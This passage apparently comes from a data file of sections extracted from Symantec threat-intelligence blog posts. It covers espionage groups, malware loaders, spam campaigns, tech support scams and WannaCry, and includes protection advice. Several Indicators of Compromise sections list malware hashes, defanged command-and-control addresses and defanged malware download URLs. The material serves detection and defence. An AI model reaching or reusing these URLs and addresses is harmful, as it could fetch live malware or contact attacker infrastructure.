ReverseSSH\ne9572549b2f35f32861ffc9be160e9c8f86e4d9d3dd43c3727f0df4dc2acc944 \u2013 Infostealer\nb7472c6f6cba47ec85fa147c78f3a7a40a4fc5913fe41654ab499a7b1bd4ea2e \u2013 Batch file used to register custom DLL to hook into Windows authentication mechanisms\n3e4d86c4e1d463b99478f960c9c00f7d11cd0d1fb8dd2948e8340b7bc3550904 \u2013 Batch file used to register custom DLL to hook into Windows authentication mechanisms\nfb603072418da9150673ac9826a46a2b2462c8fc0afeacb2034ecb2b7d666001 \u2013 Batch file used to register custom DLL to hook into Windows authentication mechanisms\n340e872c814d221989ca2cb93819b9ad307572851b5b3f8bfcf791ff08e0e677 \u2013 Suspicious Windows script file\n80c3effc8f017b26c549bed8ba82097a6be7a59e383dd35adc917bf661e0a754 \u2013 Windows script file that drops SharpGPOAbuse and Rakshasa\n9b1794a1c8c59631d95178c7c4e2f5917b84864b342b4cfdab8f0990c3dbf5d2 \u2013 FastReverseProxy\nca0eeb4b71d4124dec785a9492970e9b1cfaa4cab0e8ca4486fc14b2e256d7f7 \u2013 Inveigh\nd7b85b92fb185272b89a7ff27424bff22a5a6542f6bde9838482aa9f87979828 \u2013 Dismap\nfa6de0d0bc9d83a3942aa8b3a12a5924dc662bec32cb3c2f212a0a0c0a4ebc7a \u2013 SharpNbtscan\n10029f14f2718362144b0e9b660994e8fb944af9ce9fcff04925f8b0615bb509 \u2013 SharpGPOAbuse\naa096f18e712ac0604e18d16441b672fcb393de9edf3ff4393519c48ab26a158 \u2013 Rakshasa\n386eb7aa33c76ce671d6685f79512597f1fab28ea46c8ec7d89e58340081e2bd \u2013 Bitdefender Crash Handler (2011)\n38.60.146[.]78:443 \u2013 Stowaway\n118.107.219[.]66:443 \u2013 Stowaway\n45.123.188[.]180 \u2013 FastReverseProxy\n198.244.237[.]131 \u2013 Rakshasa download", "source": "Symentec"}, {"title": "Introduction", "content": "The Mantis cyber-espionage group (aka Arid Viper, Desert Falcon, APT-C-23), a threat actor believed to be operating out of the Palestinian territories,is continuing to mount attacks, deploying a refreshed toolset and going to great lengths to maintain a persistent presence on targeted networks.\nWhile the group is known for targeting organizations in the Middle East, the most recent campaign uncovered by Symantec, byBroadcom Software, focused on organizations within the Palestinian territories, with malicious activity beginning in September 2022 and continuing to at least February 2023. This targeting is not unprecedented for Mantis and Symantec previously uncovered attacks against individuals located in the Palestinian territories during 2017.", "source": "Symentec"}, {"title": "Background", "content": "Mantis has been active since at least 2014, with some third-party reporting suggesting it may have been active as early as 2011. The group is known to target organizations in Israel and a number of other Middle Eastern countries. Sectors targeted include government, military, financial, media, education, energy, and think tanks. The group is known for employing spear-phishing emails and fake social media profiles to lure targets into installing malware on their devices.\nMantis is widely accepted to be linked to the Palestinian territories. Whileother vendors have linked the group to Hamas, Symantec cannot make a definitive attribution to any Palestinian organization.\nIn its most recent attacks, the group used updated versions of its custom Micropsia and Arid Gopher backdoors to compromise targets before engaging in extensive credential theft and exfiltration of stolen data.", "source": "Symentec"}, {"title": "Introduction", "content": "The Russian-linked Shuckworm espionage group (aka Gamaredon, Armageddon) is continuing to mount an intense cyber campaign against organizations in Ukraine.\nShuckworm has almost exclusively focused its operations on Ukraine since it first appeared in 2014. These attacks have continued unabated since the Russian invasion of the country. While the group's tools and tactics are simple and sometimes crude, the frequency and persistence of its attacks mean that it remains one of the key cyber threats facing organizations in the region.", "source": "Symentec"}, {"title": "Introduction", "content": "The Billbug espionage group (aka Lotus Blossom, Lotus Panda, Bronze Elgin) compromised multiple organizations in a single Southeast Asian country during an intrusion campaign that ran between August 2024 and February 2025. Targets included a government ministry, an air traffic control organization, a telecoms operator, and a construction company.\nIn addition to this, the group staged an intrusion against a news agency located in another country in Southeast Asia and an air freight organization located in another neighboring country.\nThe attacks involved the use of multiple new custom tools, including loaders, credential stealers, and a reverse SSH tool.\nThe campaign is one of the findings documented in the Threat Hunter Team's new whitepaper -Relentless Force: China-linked Espionage Actors", "source": "Symentec"}, {"title": "Background", "content": "Active since at least 2009, Billbug has largely focused on Southeast Asia, targeting governments and military organizations in particular.\nThe group first came to public attention in 2015 whenPalo Alto published a reporton its activities in Southeast Asia, linking it to over 50 different attacks over a period of three years. Its campaigns used spear-phishing emails and convincing lure documents to deliver the custom Trensil (aka Elise) Trojan.\nIn 2018, Symantecpublished an investigation on the group's activity, detailing an attack on a large telecoms operator in Southeast Asia. The attackers used PsExec to install a previously unknown piece of malware (Infostealer.Catchamas). The discovery of this attack led to the discovery of further attacks against the communications, geospatial imaging, and defense sectors, both in the U.S. and Southeast Asia. During that investigation, Symantec referred to the actor as Thrip, but we subsequently determined that Thrip and Billbug were most likely the same group and began tracking all activity under the Billbug name.\nIn 2019,Symantec published another report on the group, detailing the use of two previously unseen backdoors known as Hannotog (Backdoor.Hannotog) and Sagerunex (Backdoor.Sagerunex). Targets of this campaign included at least 12 organizations in Hong Kong, Macau, Indonesia, Malaysia, the Philippines, and Vietnam. In addition to military targets, the group also attacked organizations in the maritime communications, media, and education sectors.\nBillbug remained active in subsequent years. In November 2022,Symantec published new research on the group, highlighting an attack on a digital certificate authority in an Asian country. The targeting of a certificate authority was notable because the attackers could have accessed certificates and used them to sign malware, helping them to evade detection. Compromised certificates could also potentially be used to intercept HTTPS traffic.\nLearn more about Billbug and other Chinese threat actors in our comprehensive whitepaper:Relentless Force: China-linked Espionage Actors", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.\n4b430e9e43611aa67263f03fd42207c8ad06267d9b971db876b6e62c19a0805e \u2013 Sagerunex 2e1c25bf7e2ce2d554fca51291eaeb90c1b7c374410e7656a48af1c0afa34db4 \u2013 ChromeKatz\n6efb16aa4fd785f80914e110a4e78d3d430b18cbdd6ebd5e81f904dd58baae61 \u2013 ChromeKatz\nea87d504aff24f7daf026008fa1043cb38077eccec9c15bbe24919fc413ec7c7 \u2013 ChromeKatz\ne3869a6b82e4cf54cc25c46f2324c4bd2411222fd19054d114e7ebd32ca32cd1 \u2013 CredentialKatz\n29d31cfc4746493730cda891cf88c84f4d2e5c630f61b861acc31f4904c5b16d \u2013 CredentialKatz\n461f0803b67799da8548ebfd979053fb99cf110f40ac3fc073c3183e2f6e9ced \u2013 Reverse SSH tool\nb337a3b55e9f6d72e22fe55aba4105805bb0cf121087a3f6c79850705593d904 \u2013 Date changer\n54f0eaf2c0a3f79c5f95ef5d0c4c9ff30a727ccd08575e97cce278577d106f6b \u2013 Loader\nb75a161caab0a90ef5ce57b889534b5809af3ce2f566af79da9184eaa41135bd \u2013 Loader\nbecbfc26aef38e669907a5e454655dc9699085ca9a4e5f6ccd3fe12cde5e0594 \u2013 Suspected loader", "source": "Symentec"}, {"title": "Introduction", "content": "The number of threat actors leveraging legitimate cloud services in their attacks has grown this year as attackers have begun to realize their potential to provide low-key and low-cost infrastructure. Traffic to and from well known, trusted services such as Microsoft OneDrive or Google Drive may be less likely to raise red flags than communications with attacker-controlled infrastructure.\nIn the past few weeks alone, Symantec's Threat Hunter Team has identified three further espionage operations using cloud services and found evidence of further tools in development. Marc Elias, an investigator with the Threat Hunter Team,will be presenting these findings today (August 7) at the Black Hat Conference in Las Vegas.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.\nd728cdcf62b497362a1ba9dbaac5e442cebe86145734410212d323a6c2959f0f \u2013 Trojan.Gogra\nf1ccd604fcdc0034d94e575b3709cd124e13389bbee55c59cbbf7d4f3476e214 \u2013 Trojan.Gogra\n9f61ed14660d8f85d606605d1c4c23849bd7a05afd02444c3b33e3af591cfdc9 \u2013 Trojan.Grager\nab6a684146cec59ec3a906d9e018b318fb6452586e8ec8b4e37160bcb4adc985 \u2013 Trojan.Grager\n97551bd3ff8357831dc2b6d9e152c8968d9ce1cd0090b9683c38ea52c2457824 \u2013 Trojan.Grager\nf69fb19604362c5e945d8671ce1f63bb1b819256f51568daff6fed6b5cc2f274 \u2013 Trojan.Ondritols\n582b21409ee32ffca853064598c5f72309247ad58640e96287bb806af3e7bede \u2013 Trojan.Ondritols\n79e56dc69ca59b99f7ebf90a863f5351570e3709ead07fe250f31349d43391e6 \u2013 Trojan.Ondritols\n4057534799993a63f41502ec98181db0898d1d82df0d7902424a1899f8f7f9d2 \u2013 Trojan.Ondritols\na76507b51d84708c02ca2bd5a5775c47096bc740c9f7989afd6f34825edfcba6 \u2013 Trojan.Moontag\n527fada7052b955ffa91df3b376cc58d387b39f2f44ebdcb54bc134e112a1c14 \u2013 Trojan.Moontag\nfd9fc13dbd39f920c52fbc917d6c9ce0a28e0d049812189f1bb887486caedbeb \u2013 Trojan.Moontag\n30093c2502fed7b2b74597d06b91f57772f2ae50ac420bcaa627038af33a6982 \u2013 Whipweave\nhxxp://7-zip.tw/a/7z2301-x64[.]msi - Trojan.Grager download URL\nhxxp://7-zip.tw/a/7z2301[.]msi - Trojan.Grager download URL\n7-zip[.]tw \u2013 7-Zip typosquatted domain\n103.255.178[.]200 \u2013 MoonTag C&C\n157.245.159[.]135 \u2013 Whipweave C&C\n89.42.178[.]13 \u2013 Whipweave C&C\n30sof.onedumb[.]com \u2013 Whipweave C&C", "source": "Symentec"}, {"title": "Best Practices", "content": "Block cloud services not used by your organization\nProfile network traffic and monitor for network anomaliese.g. Large file is uploaded to a cloud service\ne.g. Large file is uploaded to a cloud service\nUse application whitelisting where applicableBlock non-browser processes connecting to cloud services\nBlock non-browser processes connecting to cloud services\nIdentify critical assets in your organization and monitor them for exfiltration of data\nActivate host based and cloud audit logs", "source": "Symentec"}, {"title": "Introduction", "content": "Cyber criminals are rushing to take advantage of the COVID-19 pandemic and in recent weeks Symantec has observed dozens of new malicious email campaigns attempting to leverage public fears about the virus.\nThe threat actors behind these campaigns have employed a range of tactics in a bid to evade detection, such as using a variety of email templates along with heavy randomization of subject lines, \"From\" addresses, IP addresses, and URL domains.\nWhen analyzing email campaigns from the month of March, the first wave was dominated by phishing and malspam (malware bearing) emails. However, as the month moved onwards, snowshoe spam took over as the most common form of campaign, accounting for more than 40 percent of all emails blocked by Symantec. This was following by phishing (30 percent), malspam (18 percent), and scams (9 percent).\nKey features of malspam campaignsTop subject line keywords: \"COVID-19\", \"corona\", \"coronavirus\", and \"masks\"Top malware categories: Generic Trojan, Infostealer, Backdoor, DownloaderTop payloads observed: Autoit Script, LokiBot, RATs/Stealer, AgentTesla, Maljava\nTop subject line keywords: \"COVID-19\", \"corona\", \"coronavirus\", and \"masks\"\nTop malware categories: Generic Trojan, Infostealer, Backdoor, Downloader\nTop payloads observed: Autoit Script, LokiBot, RATs/Stealer, AgentTesla, Maljava\nKey features of snowshoe campaignsTop subject line keywords: \"COVID\", \"corona\", \"coronavirus\", and \"masks\"Top domain names observed: \"covid\", \"corona\", \"coronavirus\" and \"wuhan\". These were recently registered domains, ready to be used in spam campaignsThe most abused gTLDs observed were.biz, .cf, .info, .online, .xyz\nTop subject line keywords: \"COVID\", \"corona\", \"coronavirus\", and \"masks\"\nTop domain names observed: \"covid\", \"corona\", \"coronavirus\" and \"wuhan\". These were recently registered domains, ready to be used in spam campaigns\nThe most abused gTLDs observed were.biz, .cf, .info, .online, .xyz", "source": "Symentec"}, {"title": "Protection", "content": "While there is always a need to protect your organization against malicious emails, at a time of fear and doubt, this need becomes more pronounced. Predictive filtering systems focused on URL and other email features are deployed in timely intervals to catch changes in the rapidly changing email threat landscape. With the help of predictive filtering system, threats that use email as a medium are filtered or blocked before they cause menace. This approach has also proved beneficial to detect the variation in these types of attacks and filter them down in terms of volume or scale.", "source": "Symentec"}, {"title": "Introduction", "content": "The group behind the Gatak Trojan (Trojan.Gatak) continues to pose a threat to organizations, with the healthcare sector in particular heavily affected by attacks. Gatak is known for infecting its victims through websites promising product licensing keys for pirated software. While the group focused on US targets, it has diversified over the past two years and attacks are now taking place against organizations in a broad range of countries.", "source": "Symentec"}, {"title": "Victims", "content": "Gatak victims are infected using websites offering product key generators or \"keygens\" for pirated software. The malware is bundled with the product key and, if the victim is tricked into downloading and opening one of these files, the malware is surreptitiously installed on their computer.\nThe attackers appear to focus on offering product keys for software that is more likely to be used in professional environments. The websites used in the attacks are controlled by the attackers and have no connection with the developers of the software.  At no point are legitimate versions of software compromised. Among the software brands used as lures were:\nSketchList3D (woodworking design software)\nNative Instruments Drumlab (sound engineering software)\nBobCAD-CAM (metalworking/manufacturing software)\nBarTender Enterprise Automation (label and barcode creation software)\nHDClone (hard disk cloning utility)\nSiemans SIMATIC STEP 7 (industrial automation software)\nCadSoft Eagle Professional (printed circuit board design software)\nPremiumSoft Navicat Premium (database administration software)\nOriginlab Originpro (data analysis and graphing software)\nManctl Skanect (3D scanning software)\nSymantec System Recovery (backup and data recovery software; now part of Veritas)\nThe product keys downloaded from these websites do not work and simply generate pseudo-random sequence of characters. This means all the victim gets from the download is a junk file and a potential Gatak infection.", "source": "Symentec"}, {"title": "Introduction", "content": "As the world becomes accustomed to living with COVID-19, people are increasingly having to prove they are vaccinated, often via the use of so-called digital vaccine passports containing their identity and vaccination record. Employers, restaurants, even the neighborhood bar are relying on this system to be secure, accurate, and to maintain user privacy. The person using the passport is also expecting the same thing.\nWith a lack of federal guidance or global policy, it has been left up to country, state, or even local municipalities to decide what passes as an \"official\" vaccine passport. Without clear requirements, the private and public sector providers of vaccine passport apps must tackle evaluating a technology and workflow that includes collecting the minimum amount of medical data and personal identifiable information (PII) required to prove vaccination records are legitimate.\nSymantec, a division ofBroadcom Software, took a look at how these digital vaccine passports work and the potential security risks and threat scenarios they present.", "source": "Symentec"}, {"title": "Conclusion", "content": "This is yet another reminder to always be vigilant of apps claiming to protect your privacy and identity, including digital passport wallets. Only give apps permission to private data that they require, nothing more. Whenever possible, avoid third-party apps claiming to securely store your vaccination records and instead use digital wallet solutions provided by the major mobile platforms, such as the Apple Health app and Google Wallet.\nApp developers should only collect and access the user data required to provide the service to the user. Developers should also understand and implement best security practices that protect the users' private data in the cloud, in transit, and on device. Anything less may compromise your users' privacy, expose personal medical data, and potentially undermine the legitimacy of their vaccination records entirely.", "source": "Symentec"}, {"title": "Introduction", "content": "Ransomware attacks continued to trend upwards in 2024, rising by 3% compared to 2023, underlining the resilience of this particular cyber threat.\nThis increase occurred despite significant disruption in the ransomware space in 2024, and a dip in attacks in the first quarter of the year. Two of 2023's leading ransomware operations,LockBitandNoberus, were subjects of law enforcement disruptions in late 2023 and early 2024, which did cause an initial decline in ransomware activity early in the year. However, activity in the space rebounded strongly in the second half of 2024.\nWhen it comes to the tactics, techniques, and procedures (TTPs) leveraged by ransomware actors, living-off-the-land and dual-use tools remain the most frequently seen tools in ransomware attack chains. Exfiltrating data in so-called double extortion attacks and disabling security software before deploying payloads are now strong focuses of ransomware actors and are two things we see frequently in ransomware attack chains prior to the ransomware being deployed. A technique called Bring Your Own Vulnerable Driver (BYOVD) has become increasingly popular among ransomware attackers over the last two years for disabling security software.\nAlso notable over the past year or so is an apparent shift in power from ransomware operators to affiliates, with ransomware operators now offering generous terms seemingly in order to attract the best affiliates. This trend was evident in the approaches taken by the operators of two of the most active ransomware families in 2024, RansomHub and Qilin.\nThe ability of ransomware operators to pivot and rebound their activity even in the face of significant pressure from law enforcement and disruptions underlines the resilience of a threat that has remained one of the biggest issues on the cybercrime landscape for many years.\nSome of the recent notable trends observed on the ransomware landscape are detailed in this blog. More details about all these trends and the ransomware landscape in general can be found in the Symantec Threat Hunter Team's latest whitepaper:Ransomware 2025: A Resilient and Persistent Threat.", "source": "Symentec"}, {"title": "Introduction", "content": "Tidal waves of spam are fuelling the growth of the Dridex Trojan, which has emerged as one of the most dangerous financial threats over the past year. The sheer size of the spam campaigns spreading Dridex (detected by Symantec as W32.Cridex) can sometimes overwhelm organizations hit by them.\nSymantec analysis of recent Dridex spam campaigns found that they are operating on a vast scale, with millions of new emails being sent out on a daily basis. The attackers behind Dridex are disciplined and professional. They operate on a standard working week, continually refine the malware, and put significant effort into disguising their spam campaigns as legitimate emails.", "source": "Symentec"}, {"title": "Victims", "content": "Dridex is mainly used to steal banking credentials. The malware is configured to target the customers of nearly 300 different organizations in over 40 regions.\nDridex is heavily focused on customers of financial institutions in wealthy, English-speaking countries, with the majority of targeted organizations located in these countries. The attackers also prioritized other European nations, along with a range of Asia-Pacific regions.", "source": "Symentec"}, {"title": "Introduction", "content": "Tech support scams continue to prey on unwitting victims. We have seen in recent months how these scams are constantly evolving, from the use ofcall optimizationto the use ofAdvanced Encryption Standard(AES) and amulti-level obfuscation scheme.\nTech support scammers' modus operandi is to get the victim to believe that their computer has been infected with malware, and that their only recourse is to call a technical support number for assistance on cleaning the system. Once on the call, a purported support executive would ask the victim for remote access to their computer and then charge a fee for the supposed cleaning they did.\nWhile scammers' playbooks remain more or less the same, we have recently seen how scammers are now tricking victims into installing a potentially unwanted application (PUA), rather than urging them to call a support helpline.", "source": "Symentec"}, {"title": "Protection", "content": "Symantec proactively protects customers against tech support scams. Our intrusion prevention system (IPS) technology protects customers by blocking malicious network activity associated with such scams using a wide variety of detections.\nIn the last quarter of 2018, Symantec's IPS blocked more than 89 million tech support scams.", "source": "Symentec"}, {"title": "Introduction", "content": "Bumblebee, a recently developed malware loader, has quickly become a key component in a wide range of cyber-crime attacks and appears to have replaced a number of older loaders, which suggests that it is the work of established actors and that the transition to Bumblebee was pre-planned.\nBy analysis of three other tools used in recent attacks involving Bumblebee, Symantec's Threat Hunter team, a part ofBroadcom Software, has linked this tool to a number of ransomware operations including Conti, Quantum, and Mountlocker. The tactics, techniques, and procedures (TTPs) used in these older attacks support the hypothesis that Bumblebee may have been introduced as a replacement loader for Trickbot and BazarLoader, since there is some overlap between recent activity involving Bumblebee and older attacks linked to these loaders.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.\n6804cff68d9824efeb087e1d6ff3f98ed947f002626f04cf8ae7ef26b51e394b \u2013 Bumblebee\ndaf055e5c7f843a3dbe34c3c7b848e5bbe9c53b65df2556b4b450390154af3bb - Bumblebee\n7259b7a91df7c9bc78b0830808fe58c6ff66aa79bb856cf1bf50a107875b3651 \u2013 Bumblebee\nac20f3f9ed0c1e6b2160976a1dc4167e53fbb8c71b4824a640131acf24c71bfd - Bumblebee\n71f91acc6a9162b600ff5191cc22f84a2b726050a5f6d9de292a4deeea0d9803 \u2013 Bumblebee\nf06566e1e309123e03a6a65cdfa06ce5a95fdd276fb7fcbcb33f5560c0a3cd8c \u2013 Cobalt Strike\n2e349b3224cc0d958e6945623098c2d28cc8977e0d45480c0188febbf7b8aa78 \u2013 Bumblebee\n302a25e21eea9ab5bc12d1c5f9e5c119619e617677b307fe0e3044c19581faea \u2013 Likely Bumblebee\n65e205b500160cbec44911080621d25f02ad7fcfcf2c3e75ce33f6f821a808b8 - Bumblebee-related DLL\n905e87d8433fa58f3006ee685bb347024b46550a3ceda0777016f39e88519142 - Bumblebee-related DLL\n6727d493d4ecc8cca83ed8bf7af63941175decff7218e599355065ae6c9563c4 - Bumblebee-related DLL\nc8db63bfab805179a1297f8b70a90a043581c9260e8c97725f4920ab93c03344 - Bumblebee-related DLL\n261b06e30a4a9960e0b0ae173486a4e456c9bd7d188d0f1c9c109bb9e2281b59- Bumblebee-related DLL\n24bf01c1a39c6fcab26173e285d226e0c2dcd8ebf86f820f2ba5339ac29086e5 - Bumblebee-related DLL\n86d7f7b265aae9eedb36bc6a8a3f0e8ec5fa08071e2e0d21774a9a8e3d4ed9e7 - Bumblebee-related DLL\n4c3d85e7c49928af0f43623dcbed474a157ef50af3cba40b7fd7ac3fe3df2f15 \u2013 Unconfirmed, possible VM detection tool\nb1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682 - AdFind\n9d0fa4b88e5b36b8801b55508ab7bc7cda9909d639d70436e972cb3761d34eda - AdFind\naf.bat 1e7737a57552b0b32356f5e54dd84a9ae85bb3acff05ef5d52aabaa996282dfb \u2013 af.bat\nadf.bat 5a1b3f9589b468a06e9427eae6b0a855d1df6cb35ab71ddbfa05279579e9cda3 \u2013 adf.bat\nee5fbc193f875a2b8859229508ca79a2ffe19d8a120ae8c5ca77b1d17233d268 - wab.exe\n5ad4fa74e71fb4ce0a885b1efb912a00c2ce3c7b4ad251ae67e6c3a8676ede02 - wabmig.exe\n02ea7b9948dfc54980fd86dc40b38575c1f401a5a466e5f9fbf9ded33eb1f6a7 - wabmig.exe\nb722655b93bcb804802f6a20d17492f9c0f08b197b09e8cd57cf3b087ca5a347 - imagingdevices.exe\na60136d7377bc1ba8c161021459e9fe9f49c692bf7b397fea676211a2da4444d \u2013 Malicious MSI file\n86c564e9fb7e45a7b0e03dd5a6e1c72b7d7a4eb42ebe6aa2e8f8a7894bed4cb5 \u2013 VBS file\n1825e14e1ea19756b55b5ccec5afbb9c2dba0591403c553a83c842bb0dd14432 - ConnectWise\n3dea930cfb0ea48c2ce9f7a8bd98ee37e2feca5fb4da8844890fa2d4f62dd105 - Atera\n52f145a4ccc0f540a130bedbf04370a842daff1ee8d8361c75a8e0d21a88cf5a - Atera\nupdate.exe 3b7512cfa21bd65bd5beecc8cb859ab4f7f5538f3caaf0703a68ec14389b357a - ConnectWise\n4c6a865771fdb400456b1e8bc9198134ac9d2f66f1654af42b4b8fc67ae018f2 - ConnectWise\nfef7d54d6c09a317d95300d10ffcc6c366dbb8f5ebf563dec13b509fff361dc1 - ConnectWise\n165b491e5b9e273a61c16de0f592e5047740658c7a2e3047f6bf518a17e59eca - ConnectWise\na8faf08997e11a53f9d38797d997c51c1a3fcf89412c3da8dcca6631c6f314a8 - ConnectWise\n01e22210e07708c0b9a0061d0f912041808e48bb8d59f960b545d0b9e11d42d2 - ConnectWise\nf5218aaa046776a12b3683c8da4945a0c4c0934e54802640a15152d9dae15d43 - ConnectWise\nbc41569c4c9b61f526c78f55993203806d09bb8c3b09dbbeaded61cd1dc2fcc2 - caexec.exe (likely similar to PAExec)\n29767c912919cb38903f12c7f41cdd1c5f39fccb9641302c97b981e4b5e31ee5 - vSphere PowerCLI component\n911c152d4e37f55bd1544794cc324364b6f03aff118cdf328127355ccc25282a - vSphere PowerCLI component\nf5cd44f1d72ef8fc734c76ca62879e1f1cb4c0603cfdc0b85b5ad6ad8326f503 - vSphere PowerCLI component\n0650722822e984da41d77b90fbd445f28e96a90af87043581896465c06ed1e44 \u2013 ConnectWise\nf01a3f2186e77251acfac9d53122a1579182bde65e694487b292a8e09cf8d465 \u2013 Cobalt Strike\n290b698d41525c4c74836ca934c0169a989a5eafde7208d90300a17a3f5bd408 \u2013 Ransom.Quantum\n3d41a002c09448d74070a7eb7c44d49da68b2790b17337686d6dd018012db89d \u2013 Ransom.Quantum\n51.68.146.200 - AS16276 OVH SAS\n154.56.0.221 - AS60602 Inovare-Prim SRL\n3.85.198.66 - AS14618 AMAZON-AES\n3.144.143.242 - AS16509 AMAZON-02\nadaptivenet[.]hostedrmm[.]com\nhxxp://127.0.0[.]1:[high-ephemeral-port]/\nhxxps://ec2-3-144-143-242.us-east-2.compute.amazonaws[.]com\nhxxps://ec2-3-85-198-66[.]compute-1.amazonaws[.]com\nadaptivenet[.]hostedrmm[.]com / 52.53.233.237 - AS16509 AMAZON-02\nhxxp://adaptivenet[.]hostedrmm[.]com/LabTech/Updates/LabtechUpdate_220.124.zip\nhxxp://adaptivenet[.]hostedrmm[.]com/LabTech/Updates/LabtechUpdate_220.77.zip\nhxxp://adaptivenet[.]hostedrmm[.]com/LabTech/transfer/tools/caexec.exe\nhxxp://adaptivenet[.]hostedrmm[.]com/LabTech/Deployment.aspx?Probe=79EA559BB87BF3C8403C40586993D4AC&ID=660\nURLs containing URI string \"/LabTech/\"\n45.153.243.93 \u2013 Bumblebee C&C", "source": "Symentec"}, {"title": "Introduction", "content": "In August 2017, we began to see a surge of emails that were tied to the Adwind remote access Trojan (RAT). This increased activity led to a peak in October 2017, when we observed a large spike in the number of emails-totaling over 1.5 million-all attempting to deliver several variants of Adwind. In November, Symantec blocked over 1.3 million malicious emails related to this threat, this represents a small dip from October but the activity trend is still definitely upwards.\nAdwind (Backdoor.Adwind) is a cross-platform, multifunctional RAT also known as AlienSpy, Frutas, Unrecom, Sockrat, JSocket, and jRAT. It was first discovered in 2013 and can be used for logging keystrokes, using the webcam, stealing information, downloading potentially malicious files, as well as a host of other nasty activities.\nThis high-volume campaign kicked off just in time for the holiday/shopping season, and the timing could be designed to give attackers more time to use any stolen credentials, as victims may let their guard down because they are more relaxed and engaged with other festive activities during this time.", "source": "Symentec"}, {"title": "Introduction", "content": "The average smartphone user these days has between 60 and 90 apps on their device. Most of these apps request some sort of information about you and the device you are using. They may want to know your name, your email address, or your real-world address. But because smartphones are so powerful, they can also get quite a bit more than that, such as your exact location. Some apps will even request access to the device's camera or microphone.\nWhile all of this is done with the user's consent, you may be surprised at the level of access some apps have to personal data. Did you know that 45 percent of the most popular Android apps and 25 percent of the most popular iOS apps request location tracking, for example? Or that 46 percent of popular Android apps and 25 percent of popular iOS apps request permission to access your device's camera? Some Android apps even ask you to give them access to your SMS messages and phone call logs.", "source": "Symentec"}, {"title": "Introduction", "content": "In my lastpost, I discussed the evolution of tech support scams and their growing penchant towards the use of code obfuscation to hide their malicious activity behind heaps of obfuscated JavaScript code. This growing trend was an endeavor, undertaken with a single and simple objective in mind: to avoid detection by string-based detection engines employed by various security vendors. This allowed the attackers behind these fake scams to remain under the radar and still be as effective as ever.\nSince then, a year has passed and a lot of water has flowed under the bridge. The threat landscape has witnessed a lot of significant changes, some of which include the introduction ofJavaScript-based coin miners, malware (in particular ransomware)exploiting vulnerabilities in Microsoft's implementation of the Server Message Block(SMB) protocol to spread, and the continuing decline in exploit kit activity. But where do tech support scams stand in today's threat landscape?\nAs it turns out, tech support scams have got meaner, adding new anti-detection techniques to their arsenal. Over the past year, there has been a growing trend towards so-called \"living off the land\" tactics, which involves attackers using tools and technologies already installed on target computers. The main benefits behind using this approach are twofold: the attacker can target a larger pool of victims (as most of the users have these tools installed by default or use these technologies frequently), and at the same time keep a low profile (as these tools are not inherently malicious, using them is unlikely to trigger any alarms). In this blog post, I will describe how tech support scams have embraced this approach by making use of the Advanced Encryption Standard (AES) specification algorithm to obfuscate their scam content.", "source": "Symentec"}, {"title": "Introduction", "content": "Symantec has uncovered further links to more closely tie the WannaCry attacks with the Lazarus group. For further details, see:WannaCry: Ransomware attacks show strong links to Lazarus group\nSymantec has uncovered two possible links that loosely tie the WannaCry ransomware attack and the Lazarus group:\nCo-occurrence of known Lazarus tools and WannaCry ransomware:Symantec identified the presence of tools exclusively used by Lazarus on machines also infected with earlier versions of WannaCry. These earlier variants of WannaCry did not have the ability to spread via SMB. The Lazarus tools could potentially have been used as method of propagating WannaCry, but this is unconfirmed.\nShared code: As tweeted by Google's Neel Mehta, there is some shared code between known Lazarus tools and the WannaCry ransomware. Symantec has determined that this shared code is a form of SSL. This SSL implementation uses a specific sequence of 75 ciphers which to date have only been seen across Lazarus tools (includingContopeeandBrambul) and WannaCry variants.\nWhile these findings do not indicate a definitive link between Lazarus and WannaCry, we believe that there are sufficient connections to warrant further investigation. We will continue to share further details of our research as it unfolds.\nA virulent new strain of ransomware known as WannaCry (Ransom.Wannacry) has hit hundreds of thousands of computers worldwide since its emergence on Friday, May 12. WannaCry is far more dangerous than other common ransomware types because of its ability to spread itself across an organization's network by exploiting critical vulnerabilities in Windows computers, which were patched by Microsoft in March 2017 (MS17-010). The exploit, known as \"Eternal Blue,\" was released online in April in the latest of aseries of leaks by a group known as the Shadow Brokers, who claimed that it had stolen the data from the Equation cyber espionage group.", "source": "Symentec"}, {"title": "Protection", "content": "Network-based protectionSymantec has the following IPS protection in place to block attempts to exploit the MS17-010 vulnerability:\nOS Attack: Microsoft SMB MS17-010 Disclosure Attempt(released May 2, 2017)\nAttack: Shellcode Download Activity(released April 24, 2017)\nSONAR behavior detection technology\nSONAR.AM.E.!g18\nSONAR.AM.E!g11\nSONAR.Cryptlk!g1\nSONAR.Cryptlocker!g59\nSONAR.Cryptlocker!g60\nSONAR.Cryptlocker!g80\nSONAR.Heuristic.159\nSONAR.Heur.Dropper\nSONAR.Heur.RGC!g151\nSONAR.Heur.RGC.CM!g13\nSONAR.Heuristic.158\nSONAR.Heuristic.161\nSONAR.SuspDataRun\nSONAR.SuspLaunch!g11\nSONAR.SuspLaunch!gen4\nSONAR.TCP!gen1\nAdvanced Machine Learning\nHeur.AdvML.A\nHeur.AdvML.B\nHeur.AdvML.D\nAntivirus\nFor expanded protection and identification purposes, the following Antivirus signatures have been updated:\nRansom.Wannacry\nRansom.CryptXXX\nTrojan.Gen.8!Cloud\nTrojan.Gen.2\nRansom.Wannacry!gen1\nRansom.Wannacry!gen2\nRansom.Wannacry!gen3\nCustomers should run LiveUpdate and verify that they have the following definition versions or later installed in order to ensure they have the most up-to-date protection:\n20170512.009\nThe following IPS signature also blocks activity related to Ransom.Wannacry:\nSystem Infected: Ransom.Ransom32 Activity\nOrganizations should also ensure that they have the latest Windows security updates installed, in particularMS17-010to prevent spreading.", "source": "Symentec"}, {"title": "Best Practices", "content": "New ransomware variants appear on a regular basis. Always keep your security software up to date to protect yourself against them.\nKeep your operating system and other software updated. Software updates will frequently include patches for newly discovered security vulnerabilities that could be exploited by ransomware attackers.\nEmail is one of the main infection methods. Be wary of unexpected emails especially if they contain links and/or attachments.\nBe extremely wary of any Microsoft Office email attachment that advises you to enable macros to view its content. Unless you are absolutely sure that this is a genuine email from a trusted source, do not enable macros and instead immediately delete the email.\nBacking up important data is the single most effective way of combating ransomware infection. Attackers have leverage over their victims by encrypting valuable files and 